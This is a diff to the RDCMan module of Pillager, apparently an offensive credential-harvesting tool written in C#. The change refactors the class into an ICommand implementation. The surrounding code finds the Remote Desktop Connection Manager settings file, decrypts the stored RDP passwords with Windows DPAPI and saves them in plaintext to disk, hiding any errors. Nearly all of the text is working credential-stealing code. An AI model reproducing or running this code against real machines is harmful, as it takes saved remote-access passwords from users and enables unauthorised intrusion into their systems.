@@ -1,3 +1,4 @@
+using Pillager.Helper;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -7,11 +8,9 @@ using System.Xml;
 
 namespace Pillager.Tools
 {
-    internal class RDCMan
+    internal class RDCMan : ICommand
     {
-        public static string ToolName = "RDCMan";
-
-        public static string DecryptPwd()
+        public string DecryptPwd()
         {
             StringBuilder sb = new StringBuilder();
             var RDGFiles = new List<string>();
@@ -34,14 +33,14 @@ namespace Pillager.Tools
             return sb.ToString();
         }
 
-        private static string DecryptPassword(string password)
+        private string DecryptPassword(string password)
         {
             byte[] passwordBytes = Convert.FromBase64String(password);
             password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser)).Replace("\0", "");
             return password;
         }
 
-        private static string ParseRDGFile(string RDGPath)
+        private string ParseRDGFile(string RDGPath)
         {
             StringBuilder stringBuilder = new StringBuilder();
             try
@@ -95,16 +94,16 @@ namespace Pillager.Tools
             return stringBuilder.ToString();
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string rdgPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Remote Desktop Connection Manager\RDCMan.settings";
                 if (!File.Exists(rdgPath)) return;
-                string savepath = Path.Combine(path, ToolName);
+                string savepath = Path.Combine(path, "RDCMan");
                 Directory.CreateDirectory(savepath);
                 string output = DecryptPwd();
-                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, ToolName + ".txt"), output);
+                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, "RDCMan.txt"), output, Encoding.UTF8);
             }
             catch { }
         }
